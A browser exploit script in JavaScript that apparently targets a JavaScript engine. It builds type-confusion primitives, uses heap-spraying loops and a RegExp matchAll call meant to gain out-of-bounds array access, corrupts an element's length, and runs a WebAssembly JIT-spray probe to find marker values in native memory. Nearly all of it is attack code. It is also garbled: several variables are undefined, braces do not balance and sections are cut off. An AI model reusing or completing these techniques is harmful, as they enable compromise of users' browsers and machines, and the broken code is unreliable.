<script>

const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);

function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
function f2i(f){f64[0]=f;return u64[0];}
function flo(f){f64[0]=f;return u32[0];}
function fhi(f){f64[0]=f;return u32[1];}
function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe;
const PINS=[0x1080011];
const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;

const marker2={zzz:2};
const objB=new Array(0x8000);
for(var i=0;i<objB.length;i++)objB[i]=marker;
// Module A: f()=42 (trigger helper)
const wasmA=new WebAssembly.Instance(new WebAssembly.Module(
  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));

log("UA: "+navigator.userAgent);
trash(230);trash(230);
objB[4]=wasmA; objB[5]=marker;
RegExp.prototype[Symbol.matchAll].call(fk,"").next();

trash(230);trash(230);
for(let r=0;r<3;r++){
  const pin=PINS[r%2];

try{
const m=re.lastIndex;
if(!Array.isArray(m)){log("NA");log("=== DONE ===");throw 0;}
log("A=true");
const cands=[];
for(let k=0x8000;k<0x20000;k++){
  try{const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
    if(lo===hi&&(lo&1n)===1n&&lo>0x100000n){if(f2i(m[k+1])===v){const v3=f2i(m[k+2]);const w=v3&0xffffffffn;if(w!==lo&&(w&1n)===1n&&w>0x100n){cands.push(k);}}}}catch(e){break;}
  if(cands.length>=6)break;

let OB=-1;
for(const k of cands){const b=f2i(m[k+2]);objB[4]=marker2;const a=f2i(m[k+2]);objB[4]=marker;if(a!==b){OB=k;break;}}

// === JIT SPRAY PROBE ===
// Create a "spray" wasm module with known f64.const markers
// Marker: 0x4141414142424242 repeated, so we can find it in memory
// Module: (func $spray (result f64) f64.const M1 f64.const M2 f64.add)
// M1 = 0x4141414141414141, M2 = 0x4242424242424242

// Build wasm bytes manually
// type section: 1 type, () -> f64
// func section: 1 func of type 0
// export section: export "s" = func 0
// code section: f64.const M1, f64.const M2, f64.add, end
const M1=[0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41]; // 0x4141414141414141
const M2=[0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42]; // 0x4242424242424242

  0x00,0x61,0x73,0x6d, 1,0,0,0,          // magic + version
  1, 5, 1, 0x60, 0, 1, 0x7c,              // type section: () -> f64
  3, 2, 1, 0,                              // func section: 1 func, type 0
  7, 5, 1, 1, 0x73, 0, 0,                  // export "s" = func 0 (size=5)
  10, 23, 1, 21, 0,                         // code section: 1 body, 21 bytes, 0 locals
  0x44, ...M1,                              // f64.const M1 (9 bytes)
  0x44, ...M2,                              // f64.const M2 (9 bytes)
  0xa0,                                     // f64.add
  0x0b                                      // end
]);
const sprayMod=new WebAssembly.Instance(new WebAssembly.Module(sprayBytes));
const sVal=sprayMod.exports.s();
log("S:"+sVal); // should be M1+M2 as f64

// Now use ES OOB to scan native memory for the marker patterns
// Setup ES OOB (same technique as p46)
try{
  const dec=new TextDecoder("windows-1252");
  const eb=new Uint8Array(0x40);eb.fill(0x41);

  objB[4]=es;
  const esAddrBI=f2i(m[OB+2])&0xffffffffn;

  // ES length corruption — proven p46 approach with BigInt
  const tq=(esAddrBI-1n)+8n;
  const off2b=tq-0x1080018n;
  if(off2b>0n&&off2b<0x400000n){
    if((off2b&7n)===0n){
      const idx=Number(off2b>>3n);
      const v=f2i(m[idx]);
      m[idx]=i2f((v&0xffffffff00000000n)|0x01200000n);
    }else{
      const idx=Number((off2b-4n)>>3n);
      const a=f2i(m[idx]);

    log("NL:"+es.length.toString(16));

      // Scan for 0x41414141 pattern (marker M1) in native memory

        }
        if(found.length>=3)break;
      }
      log("JIT:"+found.join(","));
    }
  }else{log("ES_BELOW");}
}catch(e){log("ESE:"+e.message);}
}catch(e){if(e!==0)log("E: "+e.message);}
log("W: "+wasmA.exports.f());
